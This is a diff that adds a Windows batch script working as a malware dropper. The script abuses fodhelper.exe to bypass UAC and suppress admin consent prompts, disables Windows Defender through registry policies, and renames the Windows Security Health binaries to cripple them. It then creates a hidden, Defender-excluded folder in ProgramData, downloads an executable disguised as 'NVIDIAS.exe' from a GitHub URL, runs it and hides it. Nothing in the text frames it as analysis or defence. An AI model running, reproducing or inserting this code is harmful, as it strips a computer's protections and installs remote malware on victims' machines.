@@ -1,0 +1,41 @@
+@echo off
+   IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
+REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
+fodhelper.exe
+powershell -Command "Start-Process '%~0' -Verb RunAs"
+    exit /B
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0
+powershell -window hidden -command ""
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v "DisableOnAccessProtection" /t REG_DWORD /d 1
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /f /v "DisableAntiSpyware" /t REG_DWORD /d 1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "SecurityHealth"
+takeown /f "C:\Windows\System32\SecurityHealthService.exe"
+icacls "C:\Windows\System32\SecurityHealthService.exe" /grant:r "%USERDOMAIN%\%USERNAME%":F /c
+rename C:\Windows\System32\SecurityHealthService.exe Celka.sej
+takeown /f "C:\Windows\System32\SecurityHealthSystray.exe"
+icacls "C:\Windows\System32\SecurityHealthSystray.exe" /grant:r "%USERDOMAIN%\%USERNAME%":F /c
+rename C:\Windows\System32\SecurityHealthSystray.exe Nurik.nes
+taskkill /IM SecurityHealthSystray.exe /F
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\ProgramData\QQQ
+timeout.exe /t 10
+cd "C:\ProgramData"
+mkdir "QQQ"
+attrib +h "QQQ" /s /d
+cd "C:\ProgramData\QQQ" 
+powershell -Command "Invoke-WebRequest 'https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIAS.exe' -OutFile 'NVIDIAS.exe'"
+start NVIDIAS.exe
+attrib +h "C:\ProgramData\QQQ\NVIDIAS.exe" /s /d
